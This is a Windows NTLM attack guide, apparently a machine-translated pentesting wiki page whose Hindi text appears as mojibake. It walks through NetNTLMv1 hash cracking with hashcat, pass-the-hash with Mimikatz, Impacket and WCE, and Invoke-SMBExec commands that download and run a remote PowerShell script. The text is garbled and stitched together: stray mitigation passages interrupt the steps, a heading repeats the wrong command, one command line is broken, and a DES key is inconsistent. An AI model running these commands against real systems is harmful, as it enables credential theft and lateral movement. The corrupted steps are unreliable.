<h3>рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ</h3>

<ol>
<li>рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рдПрдХ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИред</li>
<li>рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдПрдХ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХреНрд▓рд╛рдЗрдВрдЯ рд╣реИред</li>
<li>рд╣рдорд▓рд╛рд╡рд░ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХрд┐рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рдХреНрд╖реНрдп рд╕рд░реНрд╡рд░ рддрдХ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред</li>
</ol>

<h3>рд╕рдВрд░реЛрдзрди</h3>

<p>NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрд╛рдпреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ:</p>

<ul>
<li>рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрдиреЗ рдкрд░ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ рдФрд░ Kerberos рдЬреИрд╕реЗ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред</li>
<li>рдСрдереЗрдВрдЯрд┐рдХреЗрд╢рди рдЯреНрд░реИрдлрд┐рдХ рдХреЗ рд╕рд╛рде рдЦрд┐рд▓рд╡рд╛рдбрд╝ рдХрд░рдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП SMB рд╕рд╛рдЗрдирд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░реЗрдВред</li>
<li>рд╕рдВрднрд╛рд╡рд┐рдд рд╣рдорд▓реЛрдВ рдХреЗ рджрд╛рдпрд░реЗ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХрд╛ рдЕрдорд▓ рдХрд░реЗрдВред</li>
</ul>
```
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
рд╡рд┐рддрд░рд┐рдд рд╣реИрд╢рдХреИрдЯ (hashtopolis рдЬреИрд╕реЗ рдПрдХ рдЙрдкрдХрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд░реНрд╡реЛрддреНрддрдо) рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдПрдВ рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреНрдпрдерд╛ рдпрд╣ рдХрдИ рджрд┐рдиреЛрдВ рддрдХ рд▓рдЧ рд╕рдХрддрд╛ рд╣реИред
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдореЗрдВ рдЗрд╕рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рд╣реИ рдХрд┐ 'рдкрд╛рд╕рд╡рд░реНрдб' рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдбреЗрдореЛ рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗрдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
рд╣рдореЗрдВ рдЕрдм hashcat-utilities рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ рдХреНрд░реИрдХ рдХрд┐рдП рдЧрдП des рдХреБрдВрдЬреА рдХреЛ NTLM рд╣реИрд╢ рдХреЗ рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХреЗ:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
рдЕрдВрдд рдореЗрдВ рдЖрдЦрд┐рд░рдХрд╛рд░ рдЖрдЦрд┐рд░рдХрд╛рд░ рдЖрдЦрд┐рд░рдХрд╛рд░:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
# NTLM

## NTLM рд╡рд┐рд╕реНрддрд╛рд░

NTLM рдПрдХ рдкреБрд░рд╛рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕реЗ Windows рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдореЗрдВ рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб-рдореИрди-рджреА-рдорд┐рдбрд┐рд▓рдореИрди (рдкреАрдПрд╕рдПрдо) рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛рдУрдВ рдФрд░ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

## NTLM рдХреА рд╕рдорд╕реНрдпрд╛рдПрдВ

NTLM рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЪреБрдиреМрддреА, рд░рд┐рдкреНрд▓реЗ рдЕрдЯреИрдХреНрд╕, рдФрд░ рдорд┐рдбрд┐рд▓рдореИрди рдЕрдЯреИрдХреНрд╕ред рдЗрди рд╕рдорд╕реНрдпрд╛рдУрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, NTLM рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ рдЙрдкрд╛рдп рд╣реИрдВред

## NTLM рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ

NTLM рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрдЭрд╛рд╡ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

- NTLM рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрдо рд╕реЗ рдХрдо рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдХреЗрд╡рд▓ рдЬрд░реВрд░рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╣реА рд╕рдХреНрд╖рдо рдХрд░реЗрдВред
- NTLM рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╡реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВред
- NTLM рд╣реИрд╢ рдХреА рд╡реИрдзрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реИрдзрддрд╛ рдЬрд╛рдВрдЪ рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

рдЗрди рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ, NTLM рдХреЛ рд╣рд╛рд░реНрдбрди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓ рд╕рдХрддреА рд╣реИ рдФрд░ рд╕рдВрдЧрдарди рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдордЬрдмреВрдд рдХрд░ рд╕рдХрддреА рд╣реИред
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**рдЪреБрдиреМрддреА рдХреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯ рд╣реИ** рдФрд░ **2 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИрдВ**: рдПрдХ **24 рдмрд╛рдЗрдЯ** рд▓рдВрдмреА рд╣реИ рдФрд░ **рджреВрд╕рд░реА** рдХреА рд▓рдВрдмрд╛рдИ **рд╡рд┐рд╡рд┐рдз** рд╣реИред

**рдкрд╣рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **client рдФрд░ domain** рджреНрд╡рд╛рд░рд╛ рдЧрдард┐рдд **рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдХреЛ рдФрд░ **рдХреБрдВрдЬреА** рдХреЗ рд░реВрдк рдореЗрдВ **NT hash** рдХреЗ **рд╣реИрд╢ MD4** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдлрд┐рд░, **рдкрд░рд┐рдгрд╛рдо** рдХреЛ **рдХреБрдВрдЬреА** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЪреБрдиреМрддреА** рдХреЛ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП, **8 рдмрд╛рдЗрдЯ рдХрд╛ рдПрдХ client challenge рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛**ред рдХреБрд▓: 24 Bред

**рджреВрд╕рд░реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдХрдИ рдорд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдПрдХ рдирдпрд╛ client challenge, **replay attacks** рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **timestamp**...)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **pcap рд╣реИ рдЬрд┐рд╕рдиреЗ рдПрдХ рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕ рдЧрд╛рдЗрдб рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдбреЛрдореЗрди, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреБрдиреМрддреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рддреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХрд╛ рд╣реИрд╢ рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЕрдиреБрдХрд░рдг** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдкрдХреЛ рдПрдХ **рдЙрдкрдХрд░рдг** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ **рдЙрд╕ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░реЗрдЧрд╛**, **рдпрд╛** рдЖрдк рдПрдХ рдирдИ **sessionlogon** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **LSASS** рдореЗрдВ рдЙрд╕ **рд╣реИрд╢** рдХреЛ **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЬрдм рднреА рдХреЛрдИ **NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рдЙрд╕ **рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрдЧрд╛ред** рдЖрдЦрд┐рд░реА рд╡рд┐рдХрд▓реНрдк рд╣реИ рдЬрд┐рд╕реЗ mimikatz рдХрд░рддрд╛ рд╣реИред

**рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА Pass-the-Hash рд╣рдорд▓реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

### **Mimikatz**

**рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
рдпрд╣ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╢реБрд░реВ рдХрд░реЗрдЧрд╛ рдЬреЛ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдирд╛рдо рдкрд░ рд╣реЛрдЧреА рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдорд┐рдореАрдХреИрдЯреНрдЬ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди LSASS рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдорд┐рдореАрдХреИрдЯреНрдЬ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рдЕрдВрджрд░ рд╣реЛрдВрдЧреЗред рдлрд┐рд░, рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛ (тАШrunas /netonlyтАЩ рдЯреНрд░рд┐рдХ рдХреЗ рд╕рдорд╛рди рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ plain-text рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП)ред

### рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдкрд╛рд╕-рдж-рд╣реИрд╢

рдЖрдк рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдкрд╛рд╕-рдж-рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рдВрдбреЛрдЬ рдорд╢реАрдиреЛрдВ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**рдпрд╣рд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рдХрд░реЗрдВред**](../../windows/ntlm/broken-reference/)

### Impacket рд╡рд┐рдВрдбреЛрдЬ рдХрдВрдкрд╛рдЗрд▓реНрдб рдЙрдкрдХрд░рдг

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ [рд╡рд┐рдВрдбреЛрдЬ рдХреЗ рд▓рд┐рдП impacket рдмрд╛рдЗрдирд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)ред

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, cmd.exe рдФрд░ powershell.exe рдПрдХ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реИрд▓реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИрдВ) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* рдФрд░ рдХрдИ рдФрд░ Impacket рдмрд╛рдЗрдирд░реА рд╣реИрдВ...

### Invoke-TheHash

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рдкрд╛рд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### рдЗрдиреНрд╡реЛрдХ-рдбрдмреНрд▓реНрдпреВрдПрдордЖрдИрдЗрдХреНрдЬреЗрдХреНрдпреВрдЯ
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### рдЗрдиреНрд╡реЛрдХ-рдПрд╕рдПрдордмреАрдИрдиреБрдо
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди **рд╕рднреА рдЕрдиреНрдп** рдХрд╛ **рдорд┐рд╢реНрд░рдг** рд╣реИред рдЖрдк **рдХрдИ рд╣реЛрд╕реНрдЯ** рдХреЛ рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рдХрд┐рд╕реА рдХреЛ рдЫреЛрдбрд╝ рд╕рдХрддреЗ** рд╣реИрдВ рдФрд░ рдЬрд┐рд╕ **рд╡рд┐рдХрд▓реНрдк** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕реЗ **рдЪреБрди рд╕рдХрддреЗ** рд╣реИрдВ (_SMBExec, WMIExec, SMBClient, SMBEnum_). рдЕрдЧрд░ рдЖрдк **SMBExec** рдФрд░ **WMIExec** рдореЗрдВ рд╕реЗ **рдХрд┐рд╕реА рднреА** рдХреЛ рдЪреБрдирддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдк рдХреЛрдИ _**рдХрдорд╛рдВрдб**_ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ рддреЛ рдпрд╣ **рдмрд╕ рдЬрд╛рдВрдЪреЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВред
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM рдкрд╛рд╕ рдж рд╣реИрд╢](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**рдЗрд╕реЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**

рдпрд╣ рдЙрдкрдХрд░рдг mimikatz рдХреА рддрд░рд╣реА рдХрд╛рдо рдХрд░реЗрдЧрд╛ (LSASS рдореЗрдореЛрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдЧрд╛)ред
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### рдореИрдиреБрдЕрд▓ Windows рд░рд┐рдореЛрдЯ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## рдПрдХ Windows рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдирд╛

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**рдПрдХ Windows рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рд┐рдП**](broken-reference)**.**

## NTLM рд░рд┐рд▓реЗ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрдбрд░

**рдЗрди рд╣рдорд▓реЛрдВ рдХреЛ рдХреИрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╕реНрддреГрдд рдЧрд╛рдЗрдб рдкрдврд╝реЗрдВ:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## рдиреЗрдЯрд╡рд░реНрдХ рдХреИрдкреНрдЪрд░ рд╕реЗ NTLM рдЪреИрд▓реЗрдВрдЬ рдкрд╛рд░реНрд╕ рдХрд░реЗрдВ

**рдЖрдк** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**
